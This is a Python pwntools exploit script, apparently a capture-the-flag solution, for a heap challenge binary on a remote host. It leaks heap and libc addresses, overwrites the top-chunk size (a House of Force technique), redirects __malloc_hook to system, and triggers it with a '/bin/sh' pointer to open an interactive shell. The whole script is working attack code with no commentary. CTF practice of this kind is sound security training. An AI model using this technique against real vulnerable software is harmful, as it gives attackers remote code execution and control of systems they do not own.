from pwn import *

context(terminal=['tmux', 'split-window', '-h'])
p = remote("0.cloud.chals.io", 10679)
#p = process("./chal")
#p = gdb.debug("./chal")
elf = ELF("./chal")
context.binary = elf
libc = elf.libc

print("Malloc 1")
p.recvuntil(b">>> ").decode()
p.sendline(b"16")
p.recvuntil(b">>> ")
payload = b"A"*16
payload += b"0"*8
payload += b"\xff\xff\xff\xff\xff\xff\xff\xff"
payload += b"0"*8
p.sendline(payload)
heap_addr_1 = p.recvline().decode().split(":")[1].strip()[2:]
print(f"Heap addr 1: 0x{heap_addr_1}")
random_addr = p.recvline().decode().split(":")[1].strip()[2:]
print(f"Random addr: 0x{random_addr}")

libc.address = int(random_addr, 16) - libc.sym['rand']

print(f"__malloc_hook address: {libc.sym.__malloc_hook}")
offset = (libc.sym.__malloc_hook - int(heap_addr_1, 16) - 56 + 12) & 0xffffffffffffffff

print(f"New offset: {offset}")

print("Malloc 2")
p.sendline(bytes(str(offset).encode()))
p.recvuntil(b">>> ")
p.sendline(b"/bin/sh\0")
BIN_SH_ADDR = int(p.recvline().decode().split(":")[1].strip()[2:], 16)
p.recvline()
print(f"/bin/sh address: {BIN_SH_ADDR}")

print("Malloc 3")
p.recvuntil(b">>> ")
p.sendline(b"64")
p.recvuntil(b">>> ")
print(f"Writing system to __malloc_hook: {libc.sym['system'] + 5}")
p.sendline(p64(libc.sym['system'] + 5))
p.recvline()
p.recvline()

print("Malloc 4")
p.recvuntil(b">>> ")
p.sendline(bytes(str(BIN_SH_ADDR).encode()))

p.interactive()
